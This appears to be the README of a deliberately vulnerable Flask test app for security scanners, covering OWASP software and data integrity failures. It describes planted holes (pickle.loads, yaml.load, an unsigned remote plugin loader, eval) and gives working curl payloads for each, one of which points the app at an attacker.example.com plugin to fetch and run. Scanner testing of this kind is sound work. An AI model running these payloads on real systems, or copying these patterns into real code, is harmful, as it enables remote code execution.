# OWASP A08:2025 - Software and Data Integrity Failures

> **WARNING: This repository contains INTENTIONALLY VULNERABLE code for security scanner testing. DO NOT deploy to production.**

## Vulnerabilities Included

- **Insecure Deserialization** – `/api/load-profile` runs `pickle.loads()` on a client-supplied base64 blob with no integrity check, enabling arbitrary code execution via a crafted pickle
- **Unsafe YAML Deserialization** – `/api/import-config` runs `yaml.load()` (not `safe_load`) on user-supplied YAML, allowing arbitrary object instantiation
- **Unsigned Auto-Update** – `/api/update` fetches a "plugin" from a client-supplied URL and executes it with no signature or checksum verification
- **Unrestricted Code Evaluation** – `/api/calculate` runs `eval()` directly on a user-supplied formula string

## Stack
Python 3 / Flask / SQLite

## Setup
```bash
pip install -r requirements.txt
python app.py
```

## Attack Examples
```bash
# Insecure deserialization - crafted pickle payload runs arbitrary code
PAYLOAD=$(python3 -c "
import pickle, base64, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
")
curl -X POST http://localhost:5008/api/load-profile -H "Content-Type: application/json" \
  -d "{\"profile\": \"$PAYLOAD\"}"

# Unsafe YAML deserialization - arbitrary Python object instantiation
curl -X POST http://localhost:5008/api/import-config -H "Content-Type: text/plain" \
  -d "!!python/object/apply:os.system ['id']"

# Unsigned auto-update - loads and executes attacker-hosted "plugin" code
curl -X POST http://localhost:5008/api/update -H "Content-Type: application/json" \
  -d '{"name": "evil-plugin", "url": "http://attacker.example.com/evil-plugin.py"}'

# Unrestricted eval - arbitrary code execution via formula field
curl -X POST http://localhost:5008/api/calculate -H "Content-Type: application/json" \
  -d '{"formula": "__import__(\"os\").system(\"id\")"}'
```
